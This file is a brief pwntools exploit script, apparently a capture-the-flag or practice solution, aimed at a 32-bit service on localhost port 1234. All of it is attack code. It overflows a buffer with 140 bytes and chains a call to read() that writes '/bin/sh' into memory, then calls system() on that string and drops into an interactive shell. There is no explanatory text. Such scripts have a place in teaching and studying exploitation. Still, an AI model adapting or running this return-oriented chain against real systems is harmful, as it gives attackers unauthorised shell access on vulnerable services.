from pwn import *
#break 0x8048416

conn = remote('localhost',1234)

overflow = "f"*140
read_plt_addr = 0x804832c
read_addr = 0x804832c
system_addr = 0xf7e30eb0
pppr = 0x80484b6
storage = 0x8049620
cmd = "/bin/sh\n"

payload = overflow

payload += p32(read_addr)
payload += p32(pppr)
payload += p32(0)
payload += p32(storage)
payload += p32(len(cmd))

payload += p32(system_addr)
payload += p32(0xdeadbeef)
payload += p32(storage)


conn.sendline(payload)
conn.sendline(cmd)

conn.interactive()

